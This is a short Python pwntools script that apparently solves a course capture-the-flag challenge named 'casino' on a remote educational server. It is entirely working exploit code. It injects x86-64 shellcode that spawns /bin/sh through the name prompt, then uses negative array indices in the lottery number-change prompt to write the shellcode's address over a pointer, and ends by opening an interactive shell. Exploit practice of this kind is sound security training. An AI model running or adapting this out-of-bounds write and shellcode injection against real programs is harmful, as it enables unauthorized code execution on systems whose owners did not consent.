from pwn import *

conn = remote("edu-ctf.csie.org", 10172)
#conn = process("./casino")
raw_input()

shellcode = 'a'*0x20 + b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

conn.sendlineafter("Your name: ", shellcode)

age = '30'
conn.sendlineafter("Your age: ", age)

name_addr = ['6299920', '0']
idx = ['-43', '-42']
lottery_ans = ['52', '59', '59', '7', '63', '45']

for k in range(2):

    for i in range(6):
        if k == 1:
            conn.sendlineafter(": ", lottery_ans[i])
        else:
            conn.sendlineafter(": ", '101')

    conn.sendlineafter("Change the number? [1:yes 0:no]: ", '1')

    conn.sendlineafter("Which number [1 ~ 6]: ", idx[k])

    conn.sendlineafter(": ", name_addr[k])

conn.interactive()

